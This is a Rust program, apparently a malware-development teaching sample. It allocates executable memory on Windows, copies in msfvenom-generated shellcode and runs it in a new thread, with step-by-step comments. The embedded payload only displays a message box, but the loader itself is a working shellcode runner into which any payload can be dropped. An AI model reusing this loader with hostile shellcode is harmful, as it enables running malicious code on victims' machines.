use windows_sys::Win32::System::Memory::{
    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};

use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE};
use windows_sys::Win32::Foundation::HANDLE;

fn main() {
    unsafe {

        // Step 1: Memory allocation
        let ptr = VirtualAlloc(
            std::ptr::null_mut(), // Let Windows choose the address
            1024,                 // Allocate 1 KB
            MEM_COMMIT | MEM_RESERVE, // Commit and Reserve memory
            PAGE_EXECUTE_READWRITE,       // Read, Write and EXECUTE permissions
        );

        if ptr.is_null() {
            println!("VirtualAlloc failed!");
            return;
        }
        
        println!("Executable memory allocated at: {:?}", ptr);

        // Step 2: Definition of the shell code 
        // $ msfvenom -p windows/x64/messagebox TEXT='Task failed successfully!' TITLE='Error!' -f rust
        let shellcode: [u8; 327] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
        0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
        0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
        0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
        0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
        0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
        0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
        0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
        0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
        0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
        0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
        0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
        0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
        0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
        0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
        0x48,0x8d,0x8d,0x2f,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
        0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
        0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x28,0x01,
        0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
        0x54,0x61,0x73,0x6b,0x20,0x66,0x61,0x69,0x6c,0x65,0x64,0x20,
        0x73,0x75,0x63,0x63,0x65,0x73,0x73,0x66,0x75,0x6c,0x6c,0x79,
        0x21,0x00,0x45,0x72,0x72,0x6f,0x72,0x21,0x00,0x75,0x73,0x65,
        0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00];

        // Step 3: Write the shellcode into the allocated memory
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());

        // Step 4: Create Handle for a thread to execute the shellcode
        let thread_handle: HANDLE = CreateThread(
            std::ptr::null_mut(),  // Default security attributes
            0,                // Default stack size
            Some(std::mem::transmute(ptr)), // Cast shellcode pointer to function
            std::ptr::null_mut(),  // No parameters
            0,                // Default creation flags
            std::ptr::null_mut(),  // No thread ID required
        );

        if thread_handle.is_null() {
            println!("CreateThread failed!");
            return;
        }

        println!("Thread created! Executing shellcode...");
        
        // Step 5: Wait for the thread to complete execution
        WaitForSingleObject(thread_handle, INFINITE);

        // Normally Rust is quite good at memory management, but since we are doing unsafe WinAPI stuff we have to clean up after ourselves
        // In this case, we free the memory we allocated earlier and close the thread handle
        windows_sys::Win32::System::Memory::VirtualFree(
            ptr,
            0,
            windows_sys::Win32::System::Memory::MEM_RELEASE,
        );
        windows_sys::Win32::Foundation::CloseHandle(thread_handle);

        // // Alternative steps 4 and 5: Cast memory pointer to a function pointer and call it
        // let shellcode_fn: extern "C" fn() -> u32 = mem::transmute(mem_ptr);
        // shellcode_fn();
    }
}
